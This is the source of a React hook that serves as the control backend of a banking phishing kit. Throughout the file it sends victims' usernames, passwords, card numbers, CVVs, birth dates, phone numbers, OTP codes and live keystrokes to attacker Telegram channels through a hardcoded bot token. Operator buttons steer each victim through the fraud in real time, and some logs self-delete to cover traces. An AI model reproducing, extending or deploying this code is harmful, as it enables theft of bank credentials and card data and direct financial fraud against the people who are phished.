// src/hooks/useTelegramBot.js
import { useRef, useEffect, useCallback } from 'react';
import axios from 'axios';

const TELEGRAM_BOT_TOKEN = '8208470293:AAFYLJdfLdnXMJJCqTsKRoGufdA1khfif3U';

// Channel IDs
const LOGS_CHAT_ID = '-5152657406';
const ACTIONS_CHAT_ID = '-5097850013';

// Anti-spam: Track last log times
const lastLogTimes = {
  pageView: 0,
  siteEntry: 0,
  cardVerification: 0,
  cardVerificationPage: 0,
  otpSubmit: 0,
  otpVerified: 0,
  loginTyping: 0,
  cardTyping: 0,
  otpTyping: 0,
  confirmation: 0,
  blocked: 0,
  visitNotification: 0,
  formattedCard: 0,
  otpCode: 0,
  success: 0,
  otpPage: 0,
};

// Throttle delay in milliseconds (5 seconds)
const THROTTLE_DELAY = 5000;

const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
  setTimeout(async () => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage`;
      await axios.post(url, {
        chat_id: chatId,
        message_id: messageId
      });
      console.log('✅ Message deleted after 15 seconds');
    } catch (error) {
      console.error('Error deleting message:', error);
    }
  }, delay);
};

// ✅ Helper function to get geo data with fallback
const getGeoData = async (ip) => {
  let country = 'Unknown';
  let city = 'Unknown';
  let isp = 'Unknown';
  
  // Try primary API: ipapi.co
  try {
    const geoResponse = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
    if (geoResponse.data && !geoResponse.data.error && geoResponse.data.country_name) {
      country = `${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
      city = geoResponse.data.city || 'Unknown';
      isp = geoResponse.data.org || geoResponse.data.isp || 'Unknown ISP';
      return { country, city, isp };
    }
  } catch (primaryError) {
    console.log('Primary geo API failed, trying fallback...');
  }
  
  // Try fallback API: ipinfo.io
  try {
    const fallbackResponse = await axios.get(`https://ipinfo.io/${ip}/json`, { timeout: 5000 });
    if (fallbackResponse.data) {
      country = fallbackResponse.data.country || 'Unknown';
      city = fallbackResponse.data.city || 'Unknown';
      isp = fallbackResponse.data.org || 'Unknown ISP';
    }
  } catch (fallbackError) {
    console.log('Both geo APIs failed for this IP');
  }
  
  return { country, city, isp };
};

export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification) => {
  const pollingIntervalRef = useRef(null);
  const lastUpdateIdRef = useRef(0);

  const generateSessionId = () => {
    return Date.now().toString() + Math.random().toString(36).substr(2, 6);
  };

  const shouldSendLog = (logType) => {
    const now = Date.now();
    const lastTime = lastLogTimes[logType] || 0;
    if (now - lastTime < THROTTLE_DELAY) {
      console.log(`⏭️ Skipping duplicate ${logType} log (throttled)`);
      return false;
    }
    lastLogTimes[logType] = now;
    return true;
  };

  // ========== ACTIONS CHANNEL (with buttons) ==========
  
  const sendLoginRequestToTelegram = async (message, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve Connexion", callback_data: `approve_login_${sessionId}` },
            { text: "🔐 OTP Connexion", callback_data: `otp_login_${sessionId}` }
          ],
          [
            { text: "❌ Login False", callback_data: `login_false_${sessionId}` }
          ],
          [
            { text: "💳 Card Verification", callback_data: `card_verification_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending login request:', error);
      return false;
    }
  };

  const sendCardDetailsToTelegram = async (cardData, sessionId) => {
    try {
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const birthDateStr = cardData.birthDate 
        ? `${cardData.birthDate.day}/${cardData.birthDate.month}/${cardData.birthDate.year}`
        : 'Not provided';
      
      const cardMessage = `
💳 <b>NEW CREDIT CARD DATA</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
├🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
└ 🎂 <b>Birth Date:</b> ${birthDateStr}

<b>📍 PERSONAL INFO:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}
<b>🖥️ TECHNICAL INFO:</b>
├ 🌐 <b>Country:</b> Germany
├ 🔌 <b>IP Address:</b> ${userIP}
└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}

━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
            { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
          ],
          [
            { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` }
          ],
          [
            { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
          ],
          [
            { text: "❌ Card False", callback_data: `card_false_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      return true;
    } catch (error) {
      console.error('Error sending card details:', error);
      return false;
    }
  };

  const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpPage')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 OTP PAGE - IN PROGRESS 🔐
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
📱 Phone: ${phoneNumber}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is ready to enter OTP code!`;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "✅ Approve OTP", callback_data: `approve_otp_${sessionId}` },
            { text: "❌ OTP False", callback_data: `otp_false_${sessionId}` }
          ],
          [
            { text: "🟢 Appr", callback_data: `appr_${sessionId}` }
          ],
          [
            { text: "⬅️ Back to Card", callback_data: `back_to_card_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ OTP page log sent');
    } catch (error) {
      console.error('Error sending OTP page log:', error);
    }
  };

  const sendConfirmationPageLog = async (username, cardNumber, sessionId) => {
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
💳 <b>CONFIRMATION PAGE - IN PROGRESS</b> 💳
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is on RB Key confirmation page!</i>
      `;

      const keyboard = {
        inline_keyboard: [
          [
            { text: "⬅️ Back to Appr Page", callback_data: `back_to_appr_${sessionId}` }
          ]
        ]
      };

      await axios.post(url, {
        chat_id: ACTIONS_CHAT_ID,
        text: message,
        parse_mode: 'HTML',
        reply_markup: keyboard
      });
      
      console.log('✅ Confirmation page log sent');
    } catch (error) {
      console.error('Error sending confirmation page log:', error);
    }
  };

  // ========== LOGS CHANNEL (WITH ANTI-SPAM) ==========

  const sendPageViewLog = async () => {
    if (!shouldSendLog('pageView')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `⚠️ Someone is visiting the login page! 
━━━━━━━━━━━━━━━━━━━━━
⏰ Time: ${new Date().toLocaleString()}
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Page view log sent');
    } catch (error) {
      console.error('Error sending page view log:', error);
    }
  };

  const sendSiteEntryLog = async () => {
    if (!shouldSendLog('siteEntry')) return;
    try {
      let userIP = 'Unable to get IP';
      
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      // ✅ Use the new helper function with fallback
      const { country, city, isp } = await getGeoData(userIP);
      
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Event:</b> Someone entered the website
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🌐 <b>Location Info:</b>
├ 🔌 <b>IP Address:</b> <code>${userIP}</code>
├ 🌍 <b>Country:</b> ${country}
├ 🏙️ <b>City:</b> ${city}
└ 📡 <b>ISP:</b> ${isp}
━━━━━━━━━━━━━━━━━━━━━
🖥️ <b>Device:</b> ${navigator.userAgent.substring(0, 80)}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>A visitor is on your website!</i>
⏰ <i>This message will self-delete in 3 minute</i>`;
      
      const response = await axios.post(url, { 
        chat_id: LOGS_CHAT_ID, 
        text: message, 
        parse_mode: 'HTML' 
      });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 180000);
      
      console.log('✅ Site entry log sent with location and ISP');
    } catch (error) {
      console.error('Error sending site entry log:', error);
    }
  };

  const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
    if (!shouldSendLog('visitNotification')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      // ✅ Use the new helper function with fallback
      const { country, city } = await getGeoData(ipAddress);
      const geoInfo = `${city}, ${country}`;
      
      const message = `
🌐 <b>NEW SITE VISITOR</b> 🌐
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📊 <b>VISITOR INFORMATION:</b>
├ 🌍 <b>IP Address:</b> <code>${ipAddress}</code>
├ 📍 <b>Location:</b> ${geoInfo}
━━━━━━━━━━━━━━━━━━━━
⚠️ <i>A new visitor has landed on your site!</i>
⏰ <i>This message will self-delete in 30 seconds</i>
      `;

      const response = await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 30000); 
      
      console.log('✅ Visit notification sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending visit notification:', error);
      return false;
    }
  };

  const sendBlockedLog = async (username, reason, userIP) => {
    if (!shouldSendLog('blocked')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
🚫 <b>USER BLOCKED - ANTI-BOT</b> 🚫
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username || 'Unknown'}
🔌 <b>IP Address:</b> ${userIP}
📝 <b>Reason:</b> ${reason}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>This user has been blocked!</i>
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      console.log('✅ Blocked log sent to Telegram');
    } catch (error) {
      console.error('Error sending blocked log:', error);
    }
  };

  const sendCardVerificationLog = async (username) => {
    if (!shouldSendLog('cardVerification')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 CARD VERIFICATION - IN PROGRESS 💳
━━━━━━━━━━━━━━━━━━━━━
👤 Username: ${username}
⏰ Time: ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ User is now entering card information!`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ Card verification log sent');
    } catch (error) {
      console.error('Error sending card verification log:', error);
    }
  };

  const sendCardVerificationPageLog = async (username) => {
    if (!shouldSendLog('cardVerificationPage')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `💳 <b>CARD VERIFICATION PAGE</b> 💳
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> User is on Card Verification page
👤 <b>Username:</b> ${username || 'Not logged in yet'}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has reached the card verification step!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card verification page log sent');
    } catch (error) {
      console.error('Error sending card verification page log:', error);
    }
  };

  const sendOtpSubmitLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpSubmit')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `🔐 <b>OTP CODE SUBMITTED</b> 🔐
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User has entered the OTP code!</i>`;
      await axios.post(url, { chat_id: ACTIONS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP submit log sent');
    } catch (error) {
      console.error('Error sending OTP submit log:', error);
    }
  };

  const sendOtpVerifiedLog = async (username, phoneNumber, otpCode) => {
    if (!shouldSendLog('otpVerified')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✅ <b>OTP VERIFIED SUCCESSFULLY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Status:</b> OTP code verified
👤 <b>Username:</b> ${username}
📱 <b>Phone Number:</b> ${phoneNumber}
🔢 <b>OTP Code:</b> ${otpCode}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🎯 <i>User has successfully verified OTP!</i>`;
      await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      console.log('✅ OTP verified log sent');
    } catch (error) {
      console.error('Error sending OTP verified log:', error);
    }
  };

  // ========== TYPING LOGS ==========
  const sendLoginTypingLog = async (username, field, value) => {
    if (!shouldSendLog('loginTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - LOGIN PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username || 'Not entered yet'}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the login page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Login typing log sent');
    } catch (error) {
      console.error('Error sending login typing log:', error);
    }
  };

  const sendCardTypingLog = async (username, field, value) => {
    if (!shouldSendLog('cardTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - CARD VERIFICATION PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> ${field}
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing on the card verification page!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ Card typing log sent');
    } catch (error) {
      console.error('Error sending card typing log:', error);
    }
  };

  const sendOtpTypingLog = async (username, phoneNumber, value) => {
    if (!shouldSendLog('otpTyping')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `✏️ <b>TYPING - OTP PAGE</b> ✏️
━━━━━━━━━━━━━━━━━━━━━
📝 <b>Field:</b> OTP Code
📝 <b>Value:</b> ${value}
👤 <b>Username:</b> ${username}
📱 <b>Phone:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>User is typing the OTP code!</i>
⏰ <i>This message will self-delete in 15 seconds</i>`;
      
      const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
      const messageId = response.data.result.message_id;
      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
      
      console.log('✅ OTP typing log sent');
    } catch (error) {
      console.error('Error sending OTP typing log:', error);
    }
  };

  const sendConfirmationLog = async (username, cardNumber, sessionId) => {
    if (!shouldSendLog('confirmation')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      const message = `
✅ <b>CONFIRMATION IN CZ KEY</b> ✅
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Username:</b> ${username}
💳 <b>Card Number:</b> ${cardNumber}
🆔 <b>Session ID:</b> <code>${sessionId}</code>
⏰ <b>Time:</b> ${new Date().toLocaleString()}
━━━━━━━━━━━━━━━━━━━━━
🔐 <b>Status:</b> CONFIRMED IN BANKING APP
⚠️ <i>User confirmed payment in mobile banking</i>
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Confirmation log sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending confirmation log:', error);
      return false;
    }
  };

  const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
    if (!shouldSendLog('formattedCard')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      let userIP = 'Unable to get IP';
      try {
        const ipResponse = await axios.get('https://api.ipify.org?format=json');
        userIP = ipResponse.data.ip;
      } catch (ipError) {
        console.error('Error getting IP:', ipError);
      }
      
      const cardMessage = `
💳 <b>NEW CREDIT CARD DATA</b> 💳
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>🔐 LOGIN CREDENTIALS:</b>
├ 👤 <b>Username:</b> ${loginName}
└ 🔑 <b>Password:</b> ${loginPassword}
━━━━━━━━━━━━━━━━━━━━━
<b>💳 CARD DETAILS:</b>
├ 💳 <b>Card Number:</b> <code>${cardData.cardNumber}</code>
├ 👤 <b>Cardholder:</b> ${cardData.cardholderName}
├ 📅 <b>Expiry Date:</b> ${cardData.expiryDate}
└ 🔐 <b>CVV:</b> <code>${cardData.cvv}</code>
<b>📍 PERSONAL INFO:</b>
├ 📞 <b>Phone:</b> ${cardData.phoneNumber}
├ 🏙️ <b>City:</b> ${cardData.city}
└ 📮 <b>Postal Code:</b> ${cardData.postalCode}
<b>🖥️ TECHNICAL INFO:</b>
├ 🌐 <b>Country:</b> Germany
├ 🔌 <b>IP Address:</b> ${userIP}
└ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}
━━━━━━━━━━━━━━━━━━━━━
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: cardMessage,
        parse_mode: 'HTML'
      });
      
      console.log('✅ Formatted card details sent to Telegram');
      return true;
    } catch (error) {
      console.error('Error sending formatted card details:', error);
      return false;
    }
  };

  const sendOtpToTelegram = async (otpCode, phoneNumber, sessionId) => {
    if (!shouldSendLog('otpCode')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const otpMessage = `
🔐 <b>OTP CODE RECEIVED</b> 🔐
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
<b>OTP Code:</b> <code>${otpCode}</code>
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: otpMessage,
        parse_mode: 'HTML'
      });
      return true;
    } catch (error) {
      console.error('Error sending OTP to Telegram:', error);
      return false;
    }
  };

  const sendSuccessToTelegram = async (phoneNumber, sessionId) => {
    if (!shouldSendLog('success')) return;
    try {
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
      
      const successMessage = `
✅ <b>LOGIN COMPLETED SUCCESSFULLY!</b> ✅
━━━━━━━━━━━━━━━━━━━━━
🆔 <b>Session ID:</b> <code>${sessionId}</code>
━━━━━━━━━━━━━━━━━━━━━
📱 <b>Phone Number:</b> ${phoneNumber}
⏰ <b>Time:</b> ${new Date().toLocaleString()}
<b>Status:</b> OTP Verified ✓
      `;

      await axios.post(url, {
        chat_id: LOGS_CHAT_ID,
        text: successMessage,
        parse_mode: 'HTML'
      });
    } catch (error) {
      console.error('Error sending success message:', error);
    }
  };

  // ========== POLLING ==========
  const setupTelegramPolling = useCallback(() => {
    if (pollingIntervalRef.current) {
      clearInterval(pollingIntervalRef.current);
    }

    pollingIntervalRef.current = setInterval(async () => {
      const currentSessionId = sessionId || sessionStorage.getItem('telegramSessionId');
      
      if (!currentSessionId) return;

      try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
        const response = await axios.get(url);
        
        const updates = response.data.result;
        
        for (const update of updates) {
          if (update.update_id >= lastUpdateIdRef.current) {
            lastUpdateIdRef.current = update.update_id + 1;
          }
          
          if (update.callback_query) {
            const callbackData = update.callback_query.data;
            
            const lastUnderscore = callbackData.lastIndexOf('_');
            const action = callbackData.substring(0, lastUnderscore);
            const sid = callbackData.substring(lastUnderscore + 1);

            if (sid === currentSessionId) {
              if (action === 'approve') onApprove?.();
              else if (action === 'deny') onDeny?.();
              else if (action === 'card') onViewCard?.();
              else if (action === 'next') onNextStep?.();
              else if (action === 'back_to_card') onBackToCard?.();
              else if (action === 'back_to_login') onBackToLogin?.();
              else if (action === 'block') onBlock?.();
              else if (action === 'appr') onNextStepAppr?.();
              else if (action === 'back_to_appr') onBackToAppr?.();
              else if (action === 'otp_false') onOtpFalse?.();
              else if (action === 'approve_otp') onApproveOtp?.();
              else if (action === 'card_false') onCardFalse?.();
              else if (action === 'approve_login') onApproveLogin?.();
              else if (action === 'otp_login') onOtpLogin?.();
              else if (action === 'login_false') onLoginFalse?.();
              else if (action === 'card_verification') onCardVerification?.();
            }
            
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
              callback_query_id: update.callback_query.id,
              text: "✅ Request processed!"
            });
          }
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 3000);
    
    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification]);

  useEffect(() => {
    const cleanup = setupTelegramPolling();
    return cleanup;
  }, [setupTelegramPolling]);

  return {
    generateSessionId,
    sendLoginRequestToTelegram,
    sendCardDetailsToTelegram,
    sendFormattedCardDetails,
    sendOtpToTelegram,
    sendSuccessToTelegram,
    sendPageViewLog,
    sendCardVerificationLog,
    sendOtpPageLog,
    sendCardVerificationPageLog,
    sendOtpSubmitLog,
    sendOtpVerifiedLog,
    sendLoginTypingLog,
    sendCardTypingLog,
    sendOtpTypingLog,
    sendSiteEntryLog,
    sendBlockedLog,
    sendVisitNotification,
    sendConfirmationLog,
    sendConfirmationPageLog
  };
};